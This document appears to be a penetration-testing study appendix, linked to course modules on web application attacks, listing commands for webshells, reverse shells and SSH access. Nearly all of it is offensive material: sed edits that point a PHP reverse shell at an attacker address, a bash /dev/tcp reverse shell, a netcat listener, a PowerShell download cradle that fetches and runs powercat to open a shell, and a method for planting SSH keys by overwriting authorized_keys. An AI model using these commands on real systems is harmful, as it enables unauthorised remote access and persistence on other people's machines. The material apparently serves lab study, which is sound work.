# Shells & Payloads — Command Appendix

Part of [[COMMAND APPENDIX]]. Webshells, reverse shells, and SSH-based access/persistence.

---

## Webshells

```bash
ls -la /usr/share/webshells        # php/, asp/, aspx/, cfm/, jsp/, perl/, laudanum/
ls /usr/share/webshells/php/       # simple-backdoor.php, php-reverse-shell.php
ls /usr/share/webshells/aspx/      # cmdasp.aspx

# Edit a Pentestmonkey-style reverse shell's IP/port before hosting it
sed -i "s/\$ip = '127.0.0.1';/\$ip = '<your_ip>';/" php-reverse-shell.php
sed -i "s/\$port = 1234;/\$port = 4444;/" php-reverse-shell.php
```
See [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]], [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]], [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1 (case study 4)]].

#### Tags: #Webshells #PHPWebshell #ASPNETWebshell

---

## Reverse Shells

```bash
# Bash (Linux), URL-encode if delivered via a POST body/URL parameter
bash -c "bash -i >& /dev/tcp/<your_ip>/4444 0>&1"

# Netcat listener (run this BEFORE triggering any of the below)
nc -nvlp 4444
```
```powershell
# PowerShell one-liner, base64-encode with Unicode before delivering via powershell -enc
$Text = '<powershell reverse shell script>'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
```
```bash
# Powercat (PowerShell-native netcat), host it and trigger via a download cradle
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
# Inject (URL-encoded): IEX (New-Object System.Net.Webclient).DownloadString("http://<your_ip>/powercat.ps1");powercat -c <your_ip> -p 4444 -e powershell
```
See [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]] (bash), [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] (PowerShell base64), [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]] (Powercat).

> 🔗 Reverse shell one-liners for any language/encoding: revshells.com

#### Tags: #ReverseShell #Powercat #BashReverseShell #PowerShellReverseShell

---

## SSH

```bash
# Connect with a private key on a non-standard port
ssh -i <keyfile> -p <port> <user>@<target>

# Fix key permissions (required before use)
chmod 400 <keyfile>

# Clear stale host keys (needed when a hostname gets reused across different lab VMs)
rm ~/.ssh/known_hosts

# Generate a keypair to plant (e.g. via an upload+traversal authorized_keys overwrite)
ssh-keygen -f <keyname>
cat <keyname>.pub > authorized_keys

# Convert a key OpenSSL 3.x refuses to load ("error in libcrypto: unsupported")
# Root cause is usually a corrupted/truncated copy, not real incompatibility, diff against
# a mechanically re-extracted copy before chasing OpenSSL-version theories
ssh-keygen -p -m PEM -f <keyfile>
```
See [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]] (the libcrypto troubleshooting saga), [[Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]] (planting a key via upload+traversal).

#### Tags: #SSH #SSHKeyTheft #SSHKeyPlanting #LibcryptoTroubleshooting

---

## **Outstanding**
This area grows alongside the modules. Whenever a new shell delivery mechanism comes up (msfvenom payloads, Windows named-pipe shells, etc), add it here with a link back to the source section.
